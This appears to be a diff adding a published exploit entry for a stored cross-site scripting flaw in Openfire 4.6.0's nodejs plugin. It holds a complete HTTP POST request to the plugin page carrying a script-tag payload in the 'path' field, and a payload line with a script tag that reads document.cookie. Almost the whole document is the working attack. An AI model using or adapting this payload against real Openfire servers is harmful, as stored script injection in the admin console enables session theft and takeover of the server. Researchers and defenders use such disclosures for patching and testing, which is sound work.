@@ -1,0 +1,27 @@
+# Exploit Title: Openfire 4.6.0 - 'path' Stored XSS
+# Date: 20201209
+# Exploit Author: j5s
+# Vendor Homepage: https://github.com/igniterealtime/Openfire
+# Software Link: https://www.igniterealtime.org/downloads/
+# Version: 4.6.0
+
+POST /plugins/nodejs/nodejs.jsp HTTP/1.1
+Host: 192.168.137.137:9090
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101
+Firefox/68.0
+Content-Length: 60
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+Cookie: JSESSIONID=node087pcmtxo1yry1fzb5tlt5bz4c19.node0;
+csrf=dWiihlZamEAB0mrO; DWRSESSIONID=oWZp3ax5c9EpPgMNZv4T4BASYrwhhv3K8pn;
+jiveforums.admin.logviewer=debug.size=0&all.size=524269&warn.size=856459&error.size=0&info.size=145819
+Origin: http://192.168.137.137:9090
+Referer: http://192.168.137.137:9090/plugins/nodejs/nodejs.jsp
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+path=%22%3E%3CScRiPt%3Eaozunukfyd%3C%2FsCrIpT%3E&update=Save
+
+payload："><ScRiPt>alert(document.cookie)</ScRiPt>
